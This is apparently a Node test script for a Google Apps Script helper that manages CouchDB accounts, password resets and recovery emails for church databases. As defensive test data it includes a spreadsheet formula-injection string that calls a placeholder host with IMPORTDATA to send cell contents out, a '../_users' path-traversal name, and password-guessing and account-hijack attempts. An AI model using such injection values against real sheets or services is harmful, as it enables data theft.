// Runs Code.gs unchanged in Node, with stand-ins for the Apps Script services, against the LOCAL test
// CouchDB. Run couchdb/test-rule.mjs and couchdb/probe-account-helper.mjs first (they make church_a,
// church_b, the fake users and the accounts-only "maker" admin).
import { loadHelper } from './local-shim.mjs';
import { req, as, pw, BASE } from '../couchdb/lib.mjs';

const props = { COUCH_URL: BASE + '/', MAKER_NAME: 'maker', MAKER_PASS: pw('maker') };
const logRows = [];
const sentMail = [];
const cacheStore = new Map();
const { call } = loadHelper(props, { logRows, sentMail, cacheStore });
const canLogIn = async (name, password) => (await req(null, 'POST', '/_session', { name, password })).status === 200;

let pass = 0, fail = 0;
const rows = [];
function check(label, good, detail) { good ? pass++ : fail++; rows.push(`${good ? 'PASS' : 'FAIL'}  ${label}${detail ? '  -> ' + JSON.stringify(detail) : ''}`); }
const admin = (who, extra) => ({ db: 'church_a', adminName: who, adminPassword: pw(who), ...extra });
const userDoc = async name => (await req(as('admin'), 'GET', '/_users/org.couchdb.user:' + name)).json;
const putUser = doc => req(as('admin'), 'PUT', '/_users/org.couchdb.user:' + doc.name, doc);
async function deleteUser(name) {
  const old = await req(as('admin'), 'GET', '/_users/org.couchdb.user:' + name);
  if (old.status === 200) await req(as('admin'), 'DELETE', `/_users/org.couchdb.user:${name}?rev=${old.json._rev}`);
}
async function addToChurchA(name) {
  const sec = (await req(as('admin'), 'GET', '/church_a/_security')).json;
  if (!sec.members.names.includes(name)) sec.members.names.push(name);
  await req(as('admin'), 'PUT', '/church_a/_security', sec);
}

// ---- church admins: creating accounts
await deleteUser('newperson');
let r = call(admin('alice', { action: 'createAccount', name: 'newperson', password: 'first-pass-1' }));
check('church admin creates an account', r.ok && r.existed === false, r);
const made = await userDoc('newperson');
check('new account has no tags, and is marked as made for this church', made && made.roles.length === 0 && made.created_for === 'church_a', { roles: made?.roles, created_for: made?.created_for });
check('new account can sign in', await canLogIn('newperson', 'first-pass-1'));
check("new account can't see the church yet", (await req({ name: 'newperson', pass: 'first-pass-1' }, 'GET', '/church_a/_all_docs')).status === 403);

r = call(admin('alice', { action: 'createAccount', name: 'vera', password: 'something-else' }));
check('existing account is left alone', r.ok && r.existed === true, r);
check("existing account's password unchanged", await canLogIn('vera', pw('vera')));
r = call(admin('alice', { action: 'createAccount', name: 'maker', password: 'xxxxxxxx' }));
check("can't create an account named like the helper's", !r.ok, r);

r = call(admin('vera', { action: 'createAccount', name: 'x1', password: 'xxxxxxxx' }));
check('viewer is refused', !r.ok, r);
r = call(admin('eddie', { action: 'createAccount', name: 'x1', password: 'xxxxxxxx' }));
check('editor is refused', !r.ok, r);
r = call({ ...admin('alice'), adminPassword: 'wrong', action: 'createAccount', name: 'x1', password: 'xxxxxxxx' });
check('wrong admin password is refused', !r.ok, r);
r = call({ ...admin('bob'), action: 'createAccount', name: 'x1', password: 'xxxxxxxx' });
check("another church's admin is refused", !r.ok, r);

// ---- church admins: resetting passwords (only accounts that belong to the church in a way the server set)
await addToChurchA('newperson');
r = call(admin('alice', { action: 'resetPassword', name: 'newperson', password: 'second-pass-2' }));
check('church admin resets an account made for this church', r.ok && await canLogIn('newperson', 'second-pass-2'), r);
r = call(admin('alice', { action: 'resetPassword', name: 'leo', password: 'new-leo-pass' }));
check('church admin resets an old-tag member', r.ok && await canLogIn('leo', 'new-leo-pass'), r);
call(admin('alice', { action: 'resetPassword', name: 'leo', password: pw('leo') }));
r = call(admin('alice', { action: 'resetPassword', name: 'eddie', password: 'hijack-eddie' }));
check("can't reset someone who is only on the list (a church admin controls the list)", !r.ok && await canLogIn('eddie', pw('eddie')), r);
await addToChurchA('bob');
r = call(admin('alice', { action: 'resetPassword', name: 'bob', password: 'hijack-bob' }));
check("adding another church's admin to your list doesn't let you reset them", !r.ok && await canLogIn('bob', pw('bob')), r);
await addToChurchA('maker');
r = call(admin('alice', { action: 'resetPassword', name: 'maker', password: 'hijack-maker' }));
check("can't reset the helper's own account", !r.ok && await canLogIn('maker', pw('maker')), r);
r = call(admin('alice', { action: 'resetPassword', name: 'alice', password: 'whatever1' }));
check("can't reset a church admin (even yourself) here", !r.ok, r);
r = call(admin('vera', { action: 'resetPassword', name: 'newperson', password: 'hijack-np' }));
check("viewer can't reset passwords", !r.ok && await canLogIn('newperson', 'second-pass-2'), r);

r = call(admin('alice', { action: 'createAccount', name: '_admin', password: 'xxxxxxxx' }));
check('names starting with _ refused', !r.ok, r);
r = call(admin('alice', { action: 'createAccount', name: 'shortpw', password: 'abc' }));
check('short password refused', !r.ok, r);
r = call({ ...admin('alice'), db: '../_users', action: 'createAccount', name: 'x2', password: 'xxxxxxxx' });
check('odd database names refused', !r.ok, r);
const logBefore = logRows.length;
r = call(admin('alice', { action: 'deleteEverything', name: 'vera' }));
check('unknown requests refused, and not logged', !r.ok && logRows.length === logBefore, r);
r = call({ action: 'status' });
check('status says the setup works and shows no version or quota', r.ok && r.reachesCouchDB && r.helperSignedIn && r.helperManagesAccounts && !('couchdb' in r) && !('emailsLeftToday' in r), r);

// ---- password guessing through the helper
for (let i = 0; i < 10; i++) call({ name: 'vic', ownPassword: 'guess-' + i, action: 'getEmail' });
r = call({ name: 'vic', ownPassword: pw('vic'), action: 'getEmail' });
check('after 10 wrong passwords in an hour, even the right one is refused for a while', !r.ok && /Too many/.test(r.error), r);
cacheStore.delete('wrong:vic');

// ---- the Log tab can't be turned into formulas
call({ action: 'requestReset', who: '=IMPORTDATA("https://example.invalid/?"&A1)' });
const lastWho = logRows[logRows.length - 1][4];
check('text starting with = is logged as plain text', String(lastWho).startsWith("'="), lastWho);

// ---- recovery email and forgotten passwords
const codeIn = mail => (mail?.body.match(/code[^:]*: ([A-Z2-9]{8})/i) || [])[1];
const lastMail = () => sentMail[sentMail.length - 1];
for (const n of ['vera', 'eddie']) { const d = await userDoc(n); delete d.email; delete d.email_sig; await putUser(d); }
cacheStore.clear();
const own = (name, extra) => ({ name, ownPassword: pw(name), ...extra });
const usedCodes = [];

r = call({ ...own('vera'), ownPassword: 'wrong', action: 'startEmail', email: 'vera@example.test' });
check('adding an email needs your own password', !r.ok && sentMail.length === 0, r);
r = call(own('vera', { action: 'startEmail', email: 'a,b@example.test' }));
check('odd addresses (commas, etc.) are refused', !r.ok && sentMail.length === 0, r);
r = call(own('vera', { action: 'startEmail', email: 'Vera@Example.test' }));
const verifyCode = codeIn(lastMail());
usedCodes.push(verifyCode);
check('a code goes to the new address first', r.ok && lastMail()?.to === 'vera@example.test' && !!verifyCode, { r, to: lastMail()?.to });
check('the email is not saved before the code', !(await userDoc('vera')).email);
r = call(own('vera', { action: 'confirmEmail', code: 'AAAAAAAA' }));
check('a wrong code does not save it', !r.ok, r);
r = call(own('vera', { action: 'confirmEmail', code: verifyCode.toLowerCase().replace(/(.{4})/, '$1-') }));
const veraDoc = await userDoc('vera');
check('the right code saves it, signed (any case, dash ok)', r.ok && veraDoc.email === 'vera@example.test' && !!veraDoc.email_sig, r);
const peek = await req(as('vic'), 'GET', '/_users/org.couchdb.user:vera');
check("others can't read the email", peek.status >= 400 && !JSON.stringify(peek.json).includes('example.test'), peek.status);

let mails = sentMail.length;
r = call({ action: 'requestReset', who: 'vera' });
const resetCode = codeIn(lastMail());
usedCodes.push(resetCode);
check('forgot password by name sends a code', r.ok && sentMail.length === mails + 1 && !!resetCode, r);
const sameReply = r.message;
mails = sentMail.length;
r = call({ action: 'requestReset', who: 'vera' });
check("asking again while a code is on its way sends nothing new (a stranger can't cancel it)", r.ok && r.message === sameReply && sentMail.length === mails, r);
r = call({ action: 'requestReset', who: 'nobody-here' });
check('unknown name: same reply, no email', r.ok && r.message === sameReply && sentMail.length === mails, r);
r = call({ action: 'requestReset', who: 'eddie' });
check('account without an email: same reply, no email', r.ok && r.message === sameReply && sentMail.length === mails, r);
r = call({ action: 'requestReset', who: 'nobody@example.test' });
check('unknown email: same reply, no email', r.ok && r.message === sameReply && sentMail.length === mails, r);

const eddieDoc = await userDoc('eddie'); eddieDoc.email = 'victim@example.test'; await putUser(eddieDoc);
r = call({ action: 'requestReset', who: 'eddie' });
const r2 = call({ action: 'requestReset', who: 'victim@example.test' });
check('an email typed straight into an account (not confirmed) is never sent to', r.ok && r2.ok && sentMail.length === mails, { r, r2 });
r = call(own('eddie', { action: 'getEmail' }));
check('...and is not shown as the recovery email', r.ok && r.email === '', r);

for (let i = 0; i < 4; i++) call({ action: 'confirmReset', name: 'vera', code: 'WRONG' + i, password: 'hacked-pass' });
r = call({ action: 'confirmReset', name: 'vera', code: resetCode, password: 'recovered-pass' });
check('right code still works after 4 wrong tries', r.ok && await canLogIn('vera', 'recovered-pass'), r);
r = call({ action: 'confirmReset', name: 'vera', code: resetCode, password: 'again-pass' });
check('a code works only once', !r.ok && await canLogIn('vera', 'recovered-pass'), r);

mails = sentMail.length;
r = call({ action: 'requestReset', who: 'VERA@example.test' });
const code2 = codeIn(lastMail());
usedCodes.push(code2);
check('forgot password by email (any case) sends a code', r.ok && sentMail.length === mails + 1 && lastMail().body.includes('vera'), r);
for (let i = 0; i < 5; i++) call({ action: 'confirmReset', name: 'vera', code: 'WRONG' + i, password: 'hacked-pass' });
r = call({ action: 'confirmReset', name: 'vera', code: code2, password: 'hacked-pass' });
check('5 wrong tries throw the code away', !r.ok && await canLogIn('vera', 'recovered-pass'), r);

mails = sentMail.length;
r = call({ action: 'requestReset', who: 'vera' });
check('3 emails an hour per account (4th is quiet)', r.ok && r.message === sameReply && sentMail.length === mails, r);
cacheStore.delete('sent:vera');
call({ action: 'requestReset', who: 'vera' });
const code3 = codeIn(lastMail());
usedCodes.push(code3);
const entry = JSON.parse(cacheStore.get('reset:vera'));
cacheStore.set('reset:vera', JSON.stringify({ ...entry, expires: Date.now() - 1 }));
r = call({ action: 'confirmReset', name: 'vera', code: code3, password: 'late-pass' });
check('an expired code fails', !r.ok && await canLogIn('vera', 'recovered-pass'), r);
check('codes are stored only as a hash', ![...cacheStore.values(), ...Object.values(props)].some(v => usedCodes.some(c => String(v).includes(c))));
check('nothing piles up in Script Properties', Object.keys(props).every(k => ['COUCH_URL', 'MAKER_NAME', 'MAKER_PASS', 'SIGNING_KEY'].includes(k)), Object.keys(props));

r = call({ ...own('vera'), ownPassword: 'recovered-pass', action: 'getEmail' });
check('you can see your own email', r.ok && r.email === 'vera@example.test', r);
r = call({ ...own('vic'), ownPassword: 'wrong', action: 'getEmail' });
check("you can't see it without your password", !r.ok, r);
r = call(own('vic', { action: 'changeOwnPassword', password: 'vic-new-pass' }));
check('you can change your own password', r.ok && await canLogIn('vic', 'vic-new-pass'), r);
call({ ...own('vic'), ownPassword: 'vic-new-pass', action: 'changeOwnPassword', password: pw('vic') });
r = call({ ...own('vic'), ownPassword: 'wrong', action: 'changeOwnPassword', password: 'hijack-vic' });
check("not without your current password", !r.ok && await canLogIn('vic', pw('vic')), r);
r = call({ ...own('vera'), ownPassword: 'recovered-pass', action: 'clearEmail' });
const cleared = await userDoc('vera');
check('you can remove your email', !cleared.email && !cleared.email_sig, r);
cleared.password = pw('vera'); await putUser(cleared);
const ed = await userDoc('eddie'); delete ed.email; await putUser(ed);

const secrets = ['first-pass-1', 'second-pass-2', 'new-leo-pass', 'hijack-bob', pw('alice'), pw('vera'), 'recovered-pass', 'hacked-pass', ...usedCodes];
const leaked = logRows.flat().some(c => secrets.some(s => String(c).includes(s)));
check(`log has ${logRows.length} rows and no passwords or codes`, logRows.length > 10 && !leaked);

console.log(rows.join('\n'));
console.log(`\n${pass} passed, ${fail} failed`);
